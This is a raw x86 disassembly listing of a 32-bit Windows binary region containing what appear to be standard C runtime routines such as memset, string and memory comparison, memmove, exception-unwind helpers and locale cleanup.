  426128:	mov    edi,DWORD PTR [ebp+0x18]
  42612b:	test   edi,edi
  42612d:	jne    0x426135
  42612f:	mov    edi,DWORD PTR ds:0x45cdb4
  426135:	push   ebx
  426136:	call   0x426b2d
  42613b:	pop    ecx
  42613c:	cmp    eax,0xffffffff
  42613f:	jne    0x426145
  426141:	xor    eax,eax
  426143:	jmp    0x426189
  426145:	cmp    eax,edi
  426147:	je     0x426167
  426149:	push   0x0
  42614b:	push   0x0
  42614d:	lea    ecx,[ebp+0x10]
  426150:	push   ecx
  426151:	push   DWORD PTR [ebp+0xc]
  426154:	push   eax
  426155:	push   edi
  426156:	call   0x426b76
  42615b:	add    esp,0x18
  42615e:	mov    esi,eax
  426160:	test   esi,esi
  426162:	je     0x426141
  426164:	mov    DWORD PTR [ebp+0xc],esi
  426167:	push   DWORD PTR [ebp+0x14]
  42616a:	push   DWORD PTR [ebp+0x10]
  42616d:	push   DWORD PTR [ebp+0xc]
  426170:	push   DWORD PTR [ebp+0x8]
  426173:	push   ebx
  426174:	call   DWORD PTR ds:0x4280d8
  42617a:	mov    edi,eax
  42617c:	test   esi,esi
  42617e:	je     0x426187
  426180:	push   esi
  426181:	call   0x4244ba
  426186:	pop    ecx
  426187:	mov    eax,edi
  426189:	lea    esp,[ebp-0x38]
  42618c:	call   0x4238e3
  426191:	ret    
  426192:	mov    eax,ds:0x45cdc4
  426197:	test   eax,eax
  426199:	je     0x4261aa
  42619b:	push   DWORD PTR [esp+0x4]
  42619f:	call   eax
  4261a1:	test   eax,eax
  4261a3:	pop    ecx
  4261a4:	je     0x4261aa
  4261a6:	xor    eax,eax
  4261a8:	inc    eax
  4261a9:	ret    
  4261aa:	xor    eax,eax
  4261ac:	ret    
  4261ad:	int3   
  4261ae:	int3   
  4261af:	int3   
  4261b0:	mov    edx,DWORD PTR [esp+0xc]
  4261b4:	mov    ecx,DWORD PTR [esp+0x4]
  4261b8:	test   edx,edx
  4261ba:	je     0x42620b
  4261bc:	xor    eax,eax
  4261be:	mov    al,BYTE PTR [esp+0x8]
  4261c2:	push   edi
  4261c3:	mov    edi,ecx
  4261c5:	cmp    edx,0x4
  4261c8:	jb     0x4261fb
  4261ca:	neg    ecx
  4261cc:	and    ecx,0x3
  4261cf:	je     0x4261dd
  4261d1:	sub    edx,ecx
  4261d3:	mov    BYTE PTR [edi],al
  4261d5:	add    edi,0x1
  4261d8:	sub    ecx,0x1
  4261db:	jne    0x4261d3
  4261dd:	mov    ecx,eax
  4261df:	shl    eax,0x8
  4261e2:	add    eax,ecx
  4261e4:	mov    ecx,eax
  4261e6:	shl    eax,0x10
  4261e9:	add    eax,ecx
  4261eb:	mov    ecx,edx
  4261ed:	and    edx,0x3
  4261f0:	shr    ecx,0x2
  4261f3:	je     0x4261fb
  4261f5:	rep stos DWORD PTR es:[edi],eax
  4261f7:	test   edx,edx
  4261f9:	je     0x426205
  4261fb:	mov    BYTE PTR [edi],al
  4261fd:	add    edi,0x1
  426200:	sub    edx,0x1
  426203:	jne    0x4261fb
  426205:	mov    eax,DWORD PTR [esp+0x8]
  426209:	pop    edi
  42620a:	ret    
  42620b:	mov    eax,DWORD PTR [esp+0x4]
  42620f:	ret    
  426210:	push   esi
  426211:	mov    esi,DWORD PTR [esp+0x8]
  426215:	test   esi,esi
  426217:	je     0x42639e
  42621d:	push   DWORD PTR [esi+0x4]
  426220:	call   0x4244ba
  426225:	push   DWORD PTR [esi+0x8]
  426228:	call   0x4244ba
  42622d:	push   DWORD PTR [esi+0xc]
  426230:	call   0x4244ba
  426235:	push   DWORD PTR [esi+0x10]
  426238:	call   0x4244ba
  42623d:	push   DWORD PTR [esi+0x14]
  426240:	call   0x4244ba
  426245:	push   DWORD PTR [esi+0x18]
  426248:	call   0x4244ba
  42624d:	push   DWORD PTR [esi]
  42624f:	call   0x4244ba
  426254:	push   DWORD PTR [esi+0x20]
  426257:	call   0x4244ba
  42625c:	push   DWORD PTR [esi+0x24]
  42625f:	call   0x4244ba
  426264:	push   DWORD PTR [esi+0x28]
  426267:	call   0x4244ba
  42626c:	push   DWORD PTR [esi+0x2c]
  42626f:	call   0x4244ba
  426274:	push   DWORD PTR [esi+0x30]
  426277:	call   0x4244ba
  42627c:	push   DWORD PTR [esi+0x34]
  42627f:	call   0x4244ba
  426284:	push   DWORD PTR [esi+0x1c]
  426287:	call   0x4244ba
  42628c:	push   DWORD PTR [esi+0x38]
  42628f:	call   0x4244ba
  426294:	push   DWORD PTR [esi+0x3c]
  426297:	call   0x4244ba
  42629c:	add    esp,0x40
  42629f:	push   DWORD PTR [esi+0x40]
  4262a2:	call   0x4244ba
  4262a7:	push   DWORD PTR [esi+0x44]
  4262aa:	call   0x4244ba
  4262af:	push   DWORD PTR [esi+0x48]
  4262b2:	call   0x4244ba
  4262b7:	push   DWORD PTR [esi+0x4c]
  4262ba:	call   0x4244ba
  4262bf:	push   DWORD PTR [esi+0x50]
  4262c2:	call   0x4244ba
  4262c7:	push   DWORD PTR [esi+0x54]
  4262ca:	call   0x4244ba
  4262cf:	push   DWORD PTR [esi+0x58]
  4262d2:	call   0x4244ba
  4262d7:	push   DWORD PTR [esi+0x5c]
  4262da:	call   0x4244ba
  4262df:	push   DWORD PTR [esi+0x60]
  4262e2:	call   0x4244ba
  4262e7:	push   DWORD PTR [esi+0x64]
  4262ea:	call   0x4244ba
  4262ef:	push   DWORD PTR [esi+0x68]
  4262f2:	call   0x4244ba
  4262f7:	push   DWORD PTR [esi+0x6c]
  4262fa:	call   0x4244ba
  4262ff:	push   DWORD PTR [esi+0x70]
  426302:	call   0x4244ba
  426307:	push   DWORD PTR [esi+0x74]
  42630a:	call   0x4244ba
  42630f:	push   DWORD PTR [esi+0x78]
  426312:	call   0x4244ba
  426317:	push   DWORD PTR [esi+0x7c]
  42631a:	call   0x4244ba
  42631f:	add    esp,0x40
  426322:	push   DWORD PTR [esi+0x80]
  426328:	call   0x4244ba
  42632d:	push   DWORD PTR [esi+0x84]
  426333:	call   0x4244ba
  426338:	push   DWORD PTR [esi+0x88]
  42633e:	call   0x4244ba
  426343:	push   DWORD PTR [esi+0x8c]
  426349:	call   0x4244ba
  42634e:	push   DWORD PTR [esi+0x90]
  426354:	call   0x4244ba
  426359:	push   DWORD PTR [esi+0x94]
  42635f:	call   0x4244ba
  426364:	push   DWORD PTR [esi+0x98]
  42636a:	call   0x4244ba
  42636f:	push   DWORD PTR [esi+0x9c]
  426375:	call   0x4244ba
  42637a:	push   DWORD PTR [esi+0xa0]
  426380:	call   0x4244ba
  426385:	push   DWORD PTR [esi+0xa4]
  42638b:	call   0x4244ba
  426390:	push   DWORD PTR [esi+0xa8]
  426396:	call   0x4244ba
  42639b:	add    esp,0x2c
  42639e:	pop    esi
  42639f:	ret    
  4263a0:	push   esi
  4263a1:	mov    esi,DWORD PTR [esp+0x8]
  4263a5:	test   esi,esi
  4263a7:	je     0x4263fd
  4263a9:	mov    eax,DWORD PTR [esi]
  4263ab:	mov    ecx,DWORD PTR ds:0x45c934
  4263b1:	cmp    eax,DWORD PTR [ecx]
  4263b3:	je     0x4263c4
  4263b5:	cmp    eax,DWORD PTR ds:0x45c904
  4263bb:	je     0x4263c4
  4263bd:	push   eax
  4263be:	call   0x4244ba
  4263c3:	pop    ecx
  4263c4:	mov    eax,DWORD PTR [esi+0x4]
  4263c7:	mov    ecx,DWORD PTR ds:0x45c934
  4263cd:	cmp    eax,DWORD PTR [ecx+0x4]
  4263d0:	je     0x4263e1
  4263d2:	cmp    eax,DWORD PTR ds:0x45c908
  4263d8:	je     0x4263e1
  4263da:	push   eax
  4263db:	call   0x4244ba
  4263e0:	pop    ecx
  4263e1:	mov    esi,DWORD PTR [esi+0x8]
  4263e4:	mov    eax,ds:0x45c934
  4263e9:	cmp    esi,DWORD PTR [eax+0x8]
  4263ec:	je     0x4263fd
  4263ee:	cmp    esi,DWORD PTR ds:0x45c90c
  4263f4:	je     0x4263fd
  4263f6:	push   esi
  4263f7:	call   0x4244ba
  4263fc:	pop    ecx
  4263fd:	pop    esi
  4263fe:	ret    
  4263ff:	push   esi
  426400:	mov    esi,DWORD PTR [esp+0x8]
  426404:	test   esi,esi
  426406:	je     0x4264d6
  42640c:	mov    eax,DWORD PTR [esi+0xc]
  42640f:	mov    ecx,DWORD PTR ds:0x45c934
  426415:	cmp    eax,DWORD PTR [ecx+0xc]
  426418:	je     0x426429
  42641a:	cmp    eax,DWORD PTR ds:0x45c910
  426420:	je     0x426429
  426422:	push   eax
  426423:	call   0x4244ba
  426428:	pop    ecx
  426429:	mov    eax,DWORD PTR [esi+0x10]
  42642c:	mov    ecx,DWORD PTR ds:0x45c934
  426432:	cmp    eax,DWORD PTR [ecx+0x10]
  426435:	je     0x426446
  426437:	cmp    eax,DWORD PTR ds:0x45c914
  42643d:	je     0x426446
  42643f:	push   eax
  426440:	call   0x4244ba
  426445:	pop    ecx
  426446:	mov    eax,DWORD PTR [esi+0x14]
  426449:	mov    ecx,DWORD PTR ds:0x45c934
  42644f:	cmp    eax,DWORD PTR [ecx+0x14]
  426452:	je     0x426463
  426454:	cmp    eax,DWORD PTR ds:0x45c918
  42645a:	je     0x426463
  42645c:	push   eax
  42645d:	call   0x4244ba
  426462:	pop    ecx
  426463:	mov    eax,DWORD PTR [esi+0x18]
  426466:	mov    ecx,DWORD PTR ds:0x45c934
  42646c:	cmp    eax,DWORD PTR [ecx+0x18]
  42646f:	je     0x426480
  426471:	cmp    eax,DWORD PTR ds:0x45c91c
  426477:	je     0x426480
  426479:	push   eax
  42647a:	call   0x4244ba
  42647f:	pop    ecx
  426480:	mov    eax,DWORD PTR [esi+0x1c]
  426483:	mov    ecx,DWORD PTR ds:0x45c934
  426489:	cmp    eax,DWORD PTR [ecx+0x1c]
  42648c:	je     0x42649d
  42648e:	cmp    eax,DWORD PTR ds:0x45c920
  426494:	je     0x42649d
  426496:	push   eax
  426497:	call   0x4244ba
  42649c:	pop    ecx
  42649d:	mov    eax,DWORD PTR [esi+0x20]
  4264a0:	mov    ecx,DWORD PTR ds:0x45c934
  4264a6:	cmp    eax,DWORD PTR [ecx+0x20]
  4264a9:	je     0x4264ba
  4264ab:	cmp    eax,DWORD PTR ds:0x45c924
  4264b1:	je     0x4264ba
  4264b3:	push   eax
  4264b4:	call   0x4244ba
  4264b9:	pop    ecx
  4264ba:	mov    esi,DWORD PTR [esi+0x24]
  4264bd:	mov    eax,ds:0x45c934
  4264c2:	cmp    esi,DWORD PTR [eax+0x24]
  4264c5:	je     0x4264d6
  4264c7:	cmp    esi,DWORD PTR ds:0x45c928
  4264cd:	je     0x4264d6
  4264cf:	push   esi
  4264d0:	call   0x4244ba
  4264d5:	pop    ecx
  4264d6:	pop    esi
  4264d7:	ret    
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	push   ebp
  4264e1:	mov    ebp,esp
  4264e3:	push   esi
  4264e4:	xor    eax,eax
  4264e6:	push   eax
  4264e7:	push   eax
  4264e8:	push   eax
  4264e9:	push   eax
  4264ea:	push   eax
  4264eb:	push   eax
  4264ec:	push   eax
  4264ed:	push   eax
  4264ee:	mov    edx,DWORD PTR [ebp+0xc]
  4264f1:	lea    ecx,[ecx+0x0]
  4264f4:	mov    al,BYTE PTR [edx]
  4264f6:	or     al,al
  4264f8:	je     0x426503
  4264fa:	add    edx,0x1
  4264fd:	bts    DWORD PTR [esp],eax
  426501:	jmp    0x4264f4
  426503:	mov    esi,DWORD PTR [ebp+0x8]
  426506:	or     ecx,0xffffffff
  426509:	lea    ecx,[ecx+0x0]
  42650c:	add    ecx,0x1
  42650f:	mov    al,BYTE PTR [esi]
  426511:	or     al,al
  426513:	je     0x42651e
  426515:	add    esi,0x1
  426518:	bt     DWORD PTR [esp],eax
  42651c:	jae    0x42650c
  42651e:	mov    eax,ecx
  426520:	add    esp,0x20
  426523:	pop    esi
  426524:	leave  
  426525:	ret    
  426526:	int3   
  426527:	int3   
  426528:	int3   
  426529:	int3   
  42652a:	int3   
  42652b:	int3   
  42652c:	int3   
  42652d:	int3   
  42652e:	int3   
  42652f:	int3   
  426530:	mov    edx,DWORD PTR [esp+0x4]
  426534:	mov    ecx,DWORD PTR [esp+0x8]
  426538:	test   edx,0x3
  42653e:	jne    0x42657c
  426540:	mov    eax,DWORD PTR [edx]
  426542:	cmp    al,BYTE PTR [ecx]
  426544:	jne    0x426574
  426546:	or     al,al
  426548:	je     0x426570
  42654a:	cmp    ah,BYTE PTR [ecx+0x1]
  42654d:	jne    0x426574
  42654f:	or     ah,ah
  426551:	je     0x426570
  426553:	shr    eax,0x10
  426556:	cmp    al,BYTE PTR [ecx+0x2]
  426559:	jne    0x426574
  42655b:	or     al,al
  42655d:	je     0x426570
  42655f:	cmp    ah,BYTE PTR [ecx+0x3]
  426562:	jne    0x426574
  426564:	add    ecx,0x4
  426567:	add    edx,0x4
  42656a:	or     ah,ah
  42656c:	jne    0x426540
  42656e:	mov    edi,edi
  426570:	xor    eax,eax
  426572:	ret    
  426573:	nop
  426574:	sbb    eax,eax
  426576:	shl    eax,1
  426578:	add    eax,0x1
  42657b:	ret    
  42657c:	test   edx,0x1
  426582:	je     0x42659c
  426584:	mov    al,BYTE PTR [edx]
  426586:	add    edx,0x1
  426589:	cmp    al,BYTE PTR [ecx]
  42658b:	jne    0x426574
  42658d:	add    ecx,0x1
  426590:	or     al,al
  426592:	je     0x426570
  426594:	test   edx,0x2
  42659a:	je     0x426540
  42659c:	mov    ax,WORD PTR [edx]
  42659f:	add    edx,0x2
  4265a2:	cmp    al,BYTE PTR [ecx]
  4265a4:	jne    0x426574
  4265a6:	or     al,al
  4265a8:	je     0x426570
  4265aa:	cmp    ah,BYTE PTR [ecx+0x1]
  4265ad:	jne    0x426574
  4265af:	or     ah,ah
  4265b1:	je     0x426570
  4265b3:	add    ecx,0x2
  4265b6:	jmp    0x426540
  4265b8:	int3   
  4265b9:	int3   
  4265ba:	int3   
  4265bb:	int3   
  4265bc:	int3   
  4265bd:	int3   
  4265be:	int3   
  4265bf:	int3   
  4265c0:	mov    eax,DWORD PTR [esp+0xc]
  4265c4:	test   eax,eax
  4265c6:	je     0x426612
  4265c8:	mov    edx,DWORD PTR [esp+0x4]
  4265cc:	push   esi
  4265cd:	push   edi
  4265ce:	mov    esi,edx
  4265d0:	mov    edi,DWORD PTR [esp+0x10]
  4265d4:	or     edx,edi
  4265d6:	and    edx,0x3
  4265d9:	je     0x426613
  4265db:	test   eax,0x1
  4265e0:	je     0x4265f3
  4265e2:	mov    cl,BYTE PTR [esi]
  4265e4:	cmp    cl,BYTE PTR [edi]
  4265e6:	jne    0x426640
  4265e8:	add    esi,0x1
  4265eb:	add    edi,0x1
  4265ee:	sub    eax,0x1
  4265f1:	je     0x426610
  4265f3:	mov    cl,BYTE PTR [esi]
  4265f5:	mov    dl,BYTE PTR [edi]
  4265f7:	cmp    cl,dl
  4265f9:	jne    0x426640
  4265fb:	mov    cl,BYTE PTR [esi+0x1]
  4265fe:	mov    dl,BYTE PTR [edi+0x1]
  426601:	cmp    cl,dl
  426603:	jne    0x426640
  426605:	add    edi,0x2
  426608:	add    esi,0x2
  42660b:	sub    eax,0x2
  42660e:	jne    0x4265f3
  426610:	pop    edi
  426611:	pop    esi
  426612:	ret    
  426613:	mov    ecx,eax
  426615:	and    eax,0x3
  426618:	shr    ecx,0x2
  42661b:	je     0x426648
  42661d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42661f:	je     0x426648
  426621:	mov    ecx,DWORD PTR [esi-0x4]
  426624:	mov    edx,DWORD PTR [edi-0x4]
  426627:	cmp    cl,dl
  426629:	jne    0x42663b
  42662b:	cmp    ch,dh
  42662d:	jne    0x42663b
  42662f:	shr    ecx,0x10
  426632:	shr    edx,0x10
  426635:	cmp    cl,dl
  426637:	jne    0x42663b
  426639:	cmp    ch,dh
  42663b:	mov    eax,0x0
  426640:	sbb    eax,eax
  426642:	pop    edi
  426643:	sbb    eax,0xffffffff
  426646:	pop    esi
  426647:	ret    
  426648:	test   eax,eax
  42664a:	je     0x426610
  42664c:	mov    edx,DWORD PTR [esi]
  42664e:	mov    ecx,DWORD PTR [edi]
  426650:	cmp    dl,cl
  426652:	jne    0x42663b
  426654:	sub    eax,0x1
  426657:	je     0x426675
  426659:	cmp    dh,ch
  42665b:	jne    0x42663b
  42665d:	sub    eax,0x1
  426660:	je     0x426675
  426662:	and    ecx,0xff0000
  426668:	and    edx,0xff0000
  42666e:	cmp    edx,ecx
  426670:	jne    0x42663b
  426672:	sub    eax,0x1
  426675:	pop    edi
  426676:	pop    esi
  426677:	ret    
  426678:	int3   
  426679:	int3   
  42667a:	int3   
  42667b:	int3   
  42667c:	int3   
  42667d:	int3   
  42667e:	int3   
  42667f:	int3   
  426680:	push   ebp
  426681:	mov    ebp,esp
  426683:	push   edi
  426684:	push   esi
  426685:	push   ebx
  426686:	mov    ecx,DWORD PTR [ebp+0x10]
  426689:	jecxz  0x4266b2
  42668b:	mov    ebx,ecx
  42668d:	mov    edi,DWORD PTR [ebp+0x8]
  426690:	mov    esi,edi
  426692:	xor    eax,eax
  426694:	repnz scas al,BYTE PTR es:[edi]
  426696:	neg    ecx
  426698:	add    ecx,ebx
  42669a:	mov    edi,esi
  42669c:	mov    esi,DWORD PTR [ebp+0xc]
  42669f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266a1:	mov    al,BYTE PTR [esi-0x1]
  4266a4:	xor    ecx,ecx
  4266a6:	cmp    al,BYTE PTR [edi-0x1]
  4266a9:	ja     0x4266b0
  4266ab:	je     0x4266b2
  4266ad:	sub    ecx,0x2
  4266b0:	not    ecx
  4266b2:	mov    eax,ecx
  4266b4:	pop    ebx
  4266b5:	pop    esi
  4266b6:	pop    edi
  4266b7:	leave  
  4266b8:	ret    
  4266b9:	int3   
  4266ba:	int3   
  4266bb:	int3   
  4266bc:	int3   
  4266bd:	int3   
  4266be:	int3   
  4266bf:	int3   
  4266c0:	push   ebp
  4266c1:	mov    ebp,esp
  4266c3:	push   esi
  4266c4:	xor    eax,eax
  4266c6:	push   eax
  4266c7:	push   eax
  4266c8:	push   eax
  4266c9:	push   eax
  4266ca:	push   eax
  4266cb:	push   eax
  4266cc:	push   eax
  4266cd:	push   eax
  4266ce:	mov    edx,DWORD PTR [ebp+0xc]
  4266d1:	lea    ecx,[ecx+0x0]
  4266d4:	mov    al,BYTE PTR [edx]
  4266d6:	or     al,al
  4266d8:	je     0x4266e3
  4266da:	add    edx,0x1
  4266dd:	bts    DWORD PTR [esp],eax
  4266e1:	jmp    0x4266d4
  4266e3:	mov    esi,DWORD PTR [ebp+0x8]
  4266e6:	mov    edi,edi
  4266e8:	mov    al,BYTE PTR [esi]
  4266ea:	or     al,al
  4266ec:	je     0x4266fa
  4266ee:	add    esi,0x1
  4266f1:	bt     DWORD PTR [esp],eax
  4266f5:	jae    0x4266e8
  4266f7:	lea    eax,[esi-0x1]
  4266fa:	add    esp,0x20
  4266fd:	pop    esi
  4266fe:	leave  
  4266ff:	ret    
  426700:	push   ebp
  426701:	mov    ebp,esp
  426703:	push   ebx
  426704:	push   esi
  426705:	push   edi
  426706:	push   ebp
  426707:	push   0x0
  426709:	push   0x0
  42670b:	push   0x426718
  426710:	push   DWORD PTR [ebp+0x8]
  426713:	call   0x42718e
  426718:	pop    ebp
  426719:	pop    edi
  42671a:	pop    esi
  42671b:	pop    ebx
  42671c:	mov    esp,ebp
  42671e:	pop    ebp
  42671f:	ret    
  426720:	mov    ecx,DWORD PTR [esp+0x4]
  426724:	test   DWORD PTR [ecx+0x4],0x6
  42672b:	mov    eax,0x1
  426730:	je     0x426741
  426732:	mov    eax,DWORD PTR [esp+0x8]
  426736:	mov    edx,DWORD PTR [esp+0x10]
  42673a:	mov    DWORD PTR [edx],eax
  42673c:	mov    eax,0x3
  426741:	ret    
  426742:	push   ebx
  426743:	push   esi
  426744:	push   edi
  426745:	mov    eax,DWORD PTR [esp+0x10]
  426749:	push   eax
  42674a:	push   0xfffffffe
  42674c:	push   0x426720
  426751:	push   DWORD PTR fs:0x0
  426758:	mov    DWORD PTR fs:0x0,esp
  42675f:	mov    eax,DWORD PTR [esp+0x20]
  426763:	mov    ebx,DWORD PTR [eax+0x8]
  426766:	mov    esi,DWORD PTR [eax+0xc]
  426769:	cmp    esi,0xffffffff
  42676c:	je     0x42679c
  42676e:	cmp    esi,DWORD PTR [esp+0x24]
  426772:	je     0x42679c
  426774:	lea    esi,[esi+esi*2]
  426777:	mov    ecx,DWORD PTR [ebx+esi*4]
  42677a:	mov    DWORD PTR [esp+0x8],ecx
  42677e:	mov    DWORD PTR [eax+0xc],ecx
  426781:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426786:	jne    0x42679a
  426788:	push   0x101
  42678d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426791:	call   0x4267d6
  426796:	call   DWORD PTR [ebx+esi*4+0x8]
  42679a:	jmp    0x42675f
  42679c:	pop    DWORD PTR fs:0x0
  4267a3:	add    esp,0xc
  4267a6:	pop    edi
  4267a7:	pop    esi
  4267a8:	pop    ebx
  4267a9:	ret    
  4267aa:	xor    eax,eax
  4267ac:	mov    ecx,DWORD PTR fs:0x0
  4267b3:	cmp    DWORD PTR [ecx+0x4],0x426720
  4267ba:	jne    0x4267cc
  4267bc:	mov    edx,DWORD PTR [ecx+0xc]
  4267bf:	mov    edx,DWORD PTR [edx+0xc]
  4267c2:	cmp    DWORD PTR [ecx+0x8],edx
  4267c5:	jne    0x4267cc
  4267c7:	mov    eax,0x1
  4267cc:	ret    
  4267cd:	push   ebx
  4267ce:	push   ecx
  4267cf:	mov    ebx,0x45c94c
  4267d4:	jmp    0x4267e0
  4267d6:	push   ebx
  4267d7:	push   ecx
  4267d8:	mov    ebx,0x45c94c
  4267dd:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e0:	mov    DWORD PTR [ebx+0x8],ecx
  4267e3:	mov    DWORD PTR [ebx+0x4],eax
  4267e6:	mov    DWORD PTR [ebx+0xc],ebp
  4267e9:	pop    ecx
  4267ea:	pop    ebx
  4267eb:	ret    0x4
  4267ee:	int3   
  4267ef:	int3   
  4267f0:	push   ebp
  4267f1:	mov    ebp,esp
  4267f3:	push   edi
  4267f4:	push   esi
  4267f5:	mov    esi,DWORD PTR [ebp+0xc]
  4267f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267fb:	mov    edi,DWORD PTR [ebp+0x8]
  4267fe:	mov    eax,ecx
  426800:	mov    edx,ecx
  426802:	add    eax,esi
  426804:	cmp    edi,esi
  426806:	jbe    0x426810
  426808:	cmp    edi,eax
  42680a:	jb     0x42698c
  426810:	test   edi,0x3
  426816:	jne    0x42682c
  426818:	shr    ecx,0x2
  42681b:	and    edx,0x3
  42681e:	cmp    ecx,0x8
  426821:	jb     0x42684c
  426823:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426825:	jmp    DWORD PTR [edx*4+0x42693c]
  42682c:	mov    eax,edi
  42682e:	mov    edx,0x3
  426833:	sub    ecx,0x4
  426836:	jb     0x426844
  426838:	and    eax,0x3
  42683b:	add    ecx,eax
  42683d:	jmp    DWORD PTR [eax*4+0x426850]
  426844:	jmp    DWORD PTR [ecx*4+0x42694c]
  42684b:	nop
  42684c:	jmp    DWORD PTR [ecx*4+0x4268d0]
  426853:	nop
  426854:	pusha  
  426855:	push   0x688c0042
  42685a:	inc    edx
  42685b:	add    BYTE PTR [eax+0x23004268],dh
  426861:	ror    DWORD PTR [edx-0x75f877fa],1
  426867:	inc    esi
  426868:	add    DWORD PTR [eax+0x468a0147],ecx
  42686e:	add    al,cl
  426870:	jmp    0x289f077
  426875:	add    esi,0x3
  426878:	add    edi,0x3
  42687b:	cmp    ecx,0x8
  42687e:	jb     0x42684c
  426880:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426882:	jmp    DWORD PTR [edx*4+0x42693c]
  426889:	lea    ecx,[ecx+0x0]
  42688c:	and    edx,ecx
  42688e:	mov    al,BYTE PTR [esi]
  426890:	mov    BYTE PTR [edi],al
  426892:	mov    al,BYTE PTR [esi+0x1]
  426895:	shr    ecx,0x2
  426898:	mov    BYTE PTR [edi+0x1],al
  42689b:	add    esi,0x2
  42689e:	add    edi,0x2
  4268a1:	cmp    ecx,0x8
  4268a4:	jb     0x42684c
  4268a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268a8:	jmp    DWORD PTR [edx*4+0x42693c]
  4268af:	nop
  4268b0:	and    edx,ecx
  4268b2:	mov    al,BYTE PTR [esi]
  4268b4:	mov    BYTE PTR [edi],al
  4268b6:	add    esi,0x1
  4268b9:	shr    ecx,0x2
  4268bc:	add    edi,0x1
  4268bf:	cmp    ecx,0x8
  4268c2:	jb     0x42684c
  4268c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268c6:	jmp    DWORD PTR [edx*4+0x42693c]
  4268cd:	lea    ecx,[ecx+0x0]
  4268d0:	xor    ebp,DWORD PTR [ecx+0x42]
  4268d3:	add    BYTE PTR [eax],ah
  4268d5:	imul   eax,DWORD PTR [edx+0x0],0x426918
  4268dc:	adc    BYTE PTR [ecx+0x42],ch
  4268df:	add    BYTE PTR [eax],cl
  4268e1:	imul   eax,DWORD PTR [edx+0x0],0x426900
  4268e8:	clc    
  4268e9:	push   0x68f00042
  4268ee:	inc    edx
  4268ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268f5:	inc    esp
  4268f6:	(bad)  
  4268f7:	in     al,0x8b
  4268f9:	inc    esp
  4268fa:	mov    gs,eax
  4268fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426900:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426904:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426908:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42690c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426910:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426914:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426918:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42691c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  426920:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  426924:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  426928:	lea    eax,[ecx*4+0x0]
  42692f:	add    esi,eax
  426931:	add    edi,eax
  426933:	jmp    DWORD PTR [edx*4+0x42693c]
  42693a:	mov    edi,edi
  42693c:	dec    esp
  42693d:	imul   eax,DWORD PTR [edx+0x0],0x426954
  426944:	pusha  
  426945:	imul   eax,DWORD PTR [edx+0x0],0x426974
  42694c:	mov    eax,DWORD PTR [ebp+0x8]
  42694f:	pop    esi
  426950:	pop    edi
  426951:	leave  
  426952:	ret    
  426953:	nop
  426954:	mov    al,BYTE PTR [esi]
  426956:	mov    BYTE PTR [edi],al
  426958:	mov    eax,DWORD PTR [ebp+0x8]
  42695b:	pop    esi
  42695c:	pop    edi
  42695d:	leave  
  42695e:	ret    
  42695f:	nop
  426960:	mov    al,BYTE PTR [esi]
  426962:	mov    BYTE PTR [edi],al
  426964:	mov    al,BYTE PTR [esi+0x1]
  426967:	mov    BYTE PTR [edi+0x1],al
  42696a:	mov    eax,DWORD PTR [ebp+0x8]
  42696d:	pop    esi
  42696e:	pop    edi
  42696f:	leave  
  426970:	ret    
  426971:	lea    ecx,[ecx+0x0]
  426974:	mov    al,BYTE PTR [esi]
  426976:	mov    BYTE PTR [edi],al
  426978:	mov    al,BYTE PTR [esi+0x1]
  42697b:	mov    BYTE PTR [edi+0x1],al
  42697e:	mov    al,BYTE PTR [esi+0x2]
  426981:	mov    BYTE PTR [edi+0x2],al
  426984:	mov    eax,DWORD PTR [ebp+0x8]
  426987:	pop    esi
  426988:	pop    edi
  426989:	leave  
  42698a:	ret    
  42698b:	nop
  42698c:	lea    esi,[ecx+esi*1-0x4]
  426990:	lea    edi,[ecx+edi*1-0x4]
  426994:	test   edi,0x3
  42699a:	jne    0x4269c0
  42699c:	shr    ecx,0x2
  42699f:	and    edx,0x3
  4269a2:	cmp    ecx,0x8
  4269a5:	jb     0x4269b4
  4269a7:	std    
  4269a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269aa:	cld    
  4269ab:	jmp    DWORD PTR [edx*4+0x426ad8]
  4269b2:	mov    edi,edi
  4269b4:	neg    ecx
  4269b6:	jmp    DWORD PTR [ecx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    eax,edi
  4269c2:	mov    edx,0x3
  4269c7:	cmp    ecx,0x4
  4269ca:	jb     0x4269d8
  4269cc:	and    eax,0x3
  4269cf:	sub    ecx,eax
  4269d1:	jmp    DWORD PTR [eax*4+0x4269dc]
  4269d8:	jmp    DWORD PTR [ecx*4+0x426ad8]
  4269df:	nop
  4269e0:	in     al,dx
  4269e1:	imul   eax,DWORD PTR [edx+0x0],0x426a10
  4269e8:	cmp    BYTE PTR [edx+0x42],ch
  4269eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4269f1:	mov    BYTE PTR [edi+0x3],al
  4269f4:	sub    esi,0x1
  4269f7:	shr    ecx,0x2
  4269fa:	sub    edi,0x1
  4269fd:	cmp    ecx,0x8
  426a00:	jb     0x4269b4
  426a02:	std    
  426a03:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a05:	cld    
  426a06:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a0d:	lea    ecx,[ecx+0x0]
